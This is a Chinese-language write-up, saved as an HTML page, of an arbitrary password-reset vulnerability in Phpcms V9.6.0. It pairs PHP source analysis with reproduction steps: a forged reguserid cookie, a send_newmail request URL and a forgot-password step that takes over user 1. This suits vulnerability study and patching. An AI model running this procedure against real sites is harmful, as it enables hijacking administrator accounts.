<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
	<head>
		<meta http-equiv="Content-Type" content="text/html; charset=utf-8" /><title>
		</title>
		<style type="text/css">
			.csAD577193{text-align:left;text-indent:0pt;margin:24pt 0pt 0pt 0pt;page-break-after:avoid;page-break-inside:avoid}
			.csDE05BCC{color:#4F81BD;background-color:transparent;font-family:Calibri;font-size:16pt;font-weight:bold;font-style:normal;}
			.csECDA2D3{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:16pt;font-weight:bold;font-style:normal;}
			.cs868C439D{text-align:left;text-indent:0pt;margin:10pt 0pt 0pt 0pt;page-break-after:avoid;page-break-inside:avoid}
			.cs83F14626{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:14pt;font-weight:bold;font-style:normal;}
			.cs40DD2BC9{text-align:left;text-indent:0pt;margin:9pt 0pt 9pt 0pt}
			.cs8926E06{color:#000000;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:normal;font-style:normal;}
			.csD6CA00D2{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:12pt;font-weight:bold;font-style:normal;}
			.cs9FB05234{color:#000000;background-color:transparent;font-family:Consolas;font-size:11pt;font-weight:normal;font-style:normal;}
			.cs9C1B1871{color:#000000;background-color:transparent;font-family:Microsoft YaHei UI;font-size:12pt;font-weight:normal;font-style:normal;}
			.cs3A447A38{text-align:left;text-indent:0pt;margin:0pt 0pt 10pt 0pt}
			.cs7FFD2630{color:#000000;background-color:transparent;font-family:Microsoft JhengHei UI;font-size:11pt;font-weight:normal;font-style:normal;}
			.cs6FD73CFB{text-align:left;text-indent:0pt;margin:5pt 24pt 5pt 24pt}
		</style>
	</head>
	<body>
		<h1 class="csAD577193">
			<a name="phpcms-v960-任意密码重置漏洞"><span class="csDE05BCC">Phpcms V9.6.0 </span><span class="csECDA2D3">任意密码重置漏洞</span></a></h1>
		<h2 class="cs868C439D">
			<a name="一漏洞简介"><span class="cs83F14626">一、漏洞简介</span></a></h2>
		<h2 class="cs868C439D">
			<a name="二漏洞影响"><span class="cs83F14626">二、漏洞影响</span></a></h2>
		<p class="cs40DD2BC9"><span class="cs8926E06">Phpcms V9.6.0</span></p><h2 class="cs868C439D">
			<a name="三复现过程"><span class="cs83F14626">三、复现过程</span></a></h2>
		<h3 class="cs868C439D">
			<a name="漏洞分析"><span class="csD6CA00D2">漏洞分析</span></a></h3>
		<p class="cs40DD2BC9"><span class="cs9FB05234">/phpcms/modules/member/index.php</span><span class="cs8926E06"> </span><span class="cs9C1B1871">第</span><span class="cs8926E06">267</span><span class="cs9C1B1871">到</span><span class="cs8926E06">312</span><span class="cs9C1B1871">行</span></p><p class="cs3A447A38"><span class="cs9FB05234">public function send_newmail() {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;$_username = param::get_cookie(&#39;_regusername&#39;);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;$_userid = param::get_cookie(&#39;_reguserid&#39;);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;$_ssouid = param::get_cookie(&#39;_reguseruid&#39;);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;$newemail = $_GET[&#39;newemail&#39;];</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> </span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;if($newemail==&#39;&#39;){//</span><span class="cs7FFD2630">邮箱为空，直接返回错误</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return &#39;2&#39;;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;$this-&gt;_init_phpsso();</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;$status = $this-&gt;client-&gt;ps_checkemail($newemail);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;if($status==&#39;-5&#39;){//</span><span class="cs7FFD2630">邮箱被占用</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;exit(&#39;-1&#39;);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;if ($status==-1) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$status = $this-&gt;client-&gt;ps_get_member_info($newemail, 3);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if($status) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$status = unserialize($status); //</span><span class="cs7FFD2630">接口返回序列化，进行判断</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if (!isset($status[&#39;uid&#39;]) || $status[&#39;uid&#39;] != intval($_ssouid)) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;exit(&#39;-1&#39;);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;} else {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;exit(&#39;-1&#39;);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;//</span><span class="cs7FFD2630">验证邮箱格式</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;pc_base::load_sys_func(&#39;mail&#39;);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;$code = sys_auth($_userid.&#39;|&#39;.microtime(true), &#39;ENCODE&#39;, get_auth_key(&#39;email&#39;));</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;$url = APP_PATH.&quot;index.php?m=member&amp;c=index&amp;a=register&amp;code=$code&amp;verify=1&quot;;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> </span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;//</span><span class="cs7FFD2630">读取配置获取验证信息</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;$member_setting = getcache(&#39;member_setting&#39;);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;$message = $member_setting[&#39;registerverifymessage&#39;];</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;$message = str_replace(array(&#39;{click}&#39;,&#39;{url}&#39;,&#39;{username}&#39;,&#39;{email}&#39;,&#39;{password}&#39;), array(&#39;&lt;a href=&quot;&#39;.$url.&#39;&quot;&gt;&#39;.L(&#39;please_click&#39;).&#39;&lt;/a&gt;&#39;,$url,$_username,$newemail,$password), $message);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> </span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;if(sendmail($newemail, L(&#39;reg_verify_email&#39;), $message)){</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//</span><span class="cs7FFD2630">更新新的邮箱，用来验证</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$this-&gt;db-&gt;update(array(&#39;email&#39;=&gt;$newemail), array(&#39;userid&#39;=&gt;$_userid));</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$this-&gt;client-&gt;ps_member_edit($_username, $newemail, &#39;&#39;, &#39;&#39;, $_ssouid);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$return = &#39;1&#39;;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;}else{</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$return = &#39;2&#39;;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;echo $return;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">}</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">　　</span><span class="cs9FB05234">$_userid</span><span class="cs9C1B1871">用</span><span class="cs8926E06"> </span><span class="cs9FB05234">param::get_cookie(&#39;_reguserid&#39;)</span><span class="cs8926E06"> </span><span class="cs9C1B1871">来获取</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">跟进去：</span><span class="cs9FB05234">/phpv9.6.0/phpcms/libs/classes/param.class.php</span><span class="cs8926E06"> </span><span class="cs9C1B1871">第</span><span class="cs8926E06">106-117</span><span class="cs9C1B1871">行。</span></p><p class="cs3A447A38"><span class="cs9FB05234">public static function get_cookie($var, $default = &#39;&#39;) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;$var = pc_base::load_config(&#39;system&#39;,&#39;cookie_pre&#39;).$var;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;$value = isset($_COOKIE[$var]) ? sys_auth($_COOKIE[$var], &#39;DECODE&#39;) : $default;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;if(in_array($var,array(&#39;_userid&#39;,&#39;userid&#39;,&#39;siteid&#39;,&#39;_groupid&#39;,&#39;_roleid&#39;))) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$value = intval($value);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;} elseif(in_array($var,array(&#39;_username&#39;,&#39;username&#39;,&#39;_nickname&#39;,&#39;admin_username&#39;,&#39;sys_lang&#39;))) { // &nbsp;site_model auth</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$value = safe_replace($value);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;return $value;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">}</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">　　这时候的</span><span class="cs8926E06">$var</span><span class="cs9C1B1871">的值是</span><span class="cs8926E06">_reguserid</span><span class="cs9C1B1871">，</span><span class="cs8926E06"> </span><span class="cs9C1B1871">然后获取前缀。</span><span class="cs9FB05234">pc_base::load_config(&#39;system&#39;,&#39;cookie_pre&#39;)</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">　　</span><span class="cs8926E06">$var</span><span class="cs9C1B1871">的值就变成了</span><span class="cs8926E06">gggCB__reguserid</span><span class="cs9C1B1871">，然后进到</span><span class="cs9FB05234">sys_auth($_COOKIE[$var], &#39;DECODE&#39;)</span><span class="cs8926E06">,</span><span class="cs9C1B1871">由于这个值我们是可控的，那找个可控的地方加密一下，也就是注册的时候，把名字注册成</span><span class="cs8926E06">1xxxx(</span><span class="cs9C1B1871">为什么是这样的后面会说</span><span class="cs8926E06">) </span><span class="cs9C1B1871">，然后他会对</span><span class="cs8926E06">username</span><span class="cs9C1B1871">进行加密，我们只要注册一个号，然后复制出里面</span><span class="cs8926E06">username</span><span class="cs9C1B1871">的值就行。</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">接着有个</span><span class="cs8926E06">if</span><span class="cs9C1B1871">判断，这就是我说文章分析错的地方，这里的</span><span class="cs8926E06">$var</span><span class="cs9C1B1871">的值是</span><span class="cs8926E06">gggCB__reguserid</span><span class="cs9C1B1871">，根本不在后面的这个数组里面，所以进入不到</span><span class="cs8926E06">$value = intval($value);</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">所以不能</span><span class="cs8926E06">intval</span><span class="cs9C1B1871">出数字来，所以文章分析错了，但是还是能密码重置。接着看，返回了</span><span class="cs8926E06">$value</span><span class="cs9C1B1871">的值，也就是</span><span class="cs8926E06">1xxxx</span><span class="cs9C1B1871">。</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">省略中间的运行：来到</span><span class="cs8926E06">304</span><span class="cs9C1B1871">行，看这句</span></p><p class="cs40DD2BC9"><span class="cs9FB05234">$this-&gt;db-&gt;update(array(&#39;email&#39;=&gt;$newemail), array(&#39;userid&#39;=&gt;$_userid));</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">进行</span><span class="cs8926E06">update</span><span class="cs9C1B1871">操作，</span><span class="cs8926E06">$newemail</span><span class="cs9C1B1871">的值是我们给的，</span><span class="cs8926E06">$_userid</span><span class="cs9C1B1871">是</span><span class="cs8926E06"> 1xxxx </span><span class="cs9C1B1871">。</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">跟进去形成</span><span class="cs8926E06">sql</span><span class="cs9C1B1871">修改。语句是这样的。</span></p><p class="cs3A447A38"><span class="cs9FB05234">UPDATE `phpcms`.`v9_member` SET `email`=&#39;aa223d@qq.com&#39; WHERE `userid` = &#39;1xxxx&#39;</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">然后在</span><span class="cs8926E06">mysql</span><span class="cs9C1B1871">中，</span><span class="cs8926E06">where 1 = &#39;1sFdsfdsf&#39; </span><span class="cs9C1B1871">是相等的，因为后面的字符串转为了数组</span><span class="cs8926E06">1</span></p><p class="cs40DD2BC9"><span><img src="Web安全/Phpcms/Phpcms%20V9.6.0%20%e4%bb%bb%e6%84%8f%e5%af%86%e7%a0%81%e9%87%8d%e7%bd%ae%e6%bc%8f%e6%b4%9e_files/image0.png" width="560" height="374" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">所以他的语句就变成了</span></p><p class="cs3A447A38"><span class="cs9FB05234">UPDATE `phpcms`.`v9_member` SET `email`=&#39;aa223d@qq.com&#39; WHERE `userid` = &#39;1&#39;</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">然后重置掉了用户</span><span class="cs8926E06">userid</span><span class="cs9C1B1871">为</span><span class="cs8926E06">1 </span><span class="cs9C1B1871">的用户</span></p><p class="cs40DD2BC9"><span class="cs8926E06">2.png</span></p><h3 class="cs868C439D">
			<a name="漏洞复现"><span class="csD6CA00D2">漏洞复现</span></a></h3>
		<p class="cs40DD2BC9"><span class="cs9C1B1871">大概的攻击流程是这样的。</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">注册一个</span><span class="cs8926E06">1xxx </span><span class="cs9C1B1871">，然后获取</span><span class="cs8926E06">cookie</span><span class="cs9C1B1871">中的</span><span class="cs8926E06">username</span><span class="cs9C1B1871">的值，然后切换一个浏览器，再次打开网页，在</span><span class="cs8926E06">f12</span><span class="cs9C1B1871">中，设置</span><span class="cs8926E06">cookie</span><span class="cs9C1B1871">的值，注意</span><span class="cs8926E06">__reguserid</span><span class="cs9C1B1871">前面的</span><span class="cs8926E06">gggCB</span><span class="cs9C1B1871">也要和</span><span class="cs8926E06">username</span><span class="cs9C1B1871">的值一样</span></p><p class="cs40DD2BC9"><span class="cs9FB05234">document.cookie=&#39;gggCB__reguserid=2f22C0FxoGesxWq73GqUXpuJBDAAEO_KZL5MuEDDeaEj9w&#39;</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">然后访问</span><span class="cs8926E06"> </span><span class="cs9FB05234">/index.php?m=member&amp;c=index&amp;a=send_newmail&amp;siteid=1&amp;newemail=q123456@qq.com</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">看到页面返回</span><span class="cs8926E06">1</span><span class="cs9C1B1871">就代表成功了，然后就去</span></p><p class="cs40DD2BC9"><span class="cs9FB05234">/index.php?m=member&amp;c=index&amp;a=public_forget_password&amp;siteid=1</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">输入你的邮箱</span><span class="cs8926E06"> </span><span class="cs9C1B1871">重置掉</span><span class="cs8926E06">userid=1</span><span class="cs9C1B1871">的密码。</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">最终</span><span class="cs8926E06">poc</span><span class="cs9C1B1871">为</span></p><p class="cs3A447A38"><span class="cs9FB05234">https://www.0-sec.org/index.php?m=member&amp;c=index&amp;a=send_newmail&amp;siteid=1&amp;newemail=aa222a@qq.com</span></p><h2 class="cs868C439D">
			<a name="参考链接"><span class="cs83F14626">参考链接</span></a></h2>
		<p class="cs6FD73CFB"><span class="cs8926E06">https://www.cnblogs.com/yangxiaodi/p/6890298.html</span></p></body>
</html>
